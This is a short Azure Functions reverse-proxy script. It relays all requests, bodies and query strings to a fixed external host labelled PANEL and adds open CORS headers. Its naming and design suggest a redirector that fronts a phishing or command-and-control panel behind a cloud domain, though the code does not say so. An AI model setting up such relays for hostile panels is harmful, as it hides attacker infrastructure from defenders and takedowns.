const PANEL = 'medd.lat';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    
    path = path.replace(/^\/api\/proxy/, '') || '/';
    if (!path.startsWith('/')) path = '/' + path;
    
    if (req.query && Object.keys(req.query).length > 0) {
        const qs = new URLSearchParams(req.query).toString();
        if (!path.includes('?')) path += '?' + qs;
    }
    
    if (path.startsWith('/cdn-cgi/')) {
        context.res = { status: 404, body: '' };
        return;
    }
    
    context.log('Forwarding to:', path);
    
    const forwardHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*'
    };
    
    // CRITICAL: forward content-type for POST bodies
    if (req.headers['content-type']) {
        forwardHeaders['Content-Type'] = req.headers['content-type'];
    }
    
    let body;
    if (!['GET','HEAD'].includes(req.method)) {
        if (req.body) {
            body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
            if (!forwardHeaders['Content-Type']) {
                forwardHeaders['Content-Type'] = 'application/json';
            }
        }
    }
    
    try {
        const r = await fetch(`https://${PANEL}${path}`, {
            method: req.method,
            headers: forwardHeaders,
            body: body,
            redirect: 'follow'  // ← CRITICAL: follow Flask redirects
        });
        
        const responseBody = await r.text();
        const contentType = r.headers.get('content-type') || 'text/html';
        
        context.res = {
            status: r.status,
            headers: {
                'Content-Type': contentType,
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type, Authorization'
            },
            body: responseBody
        };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
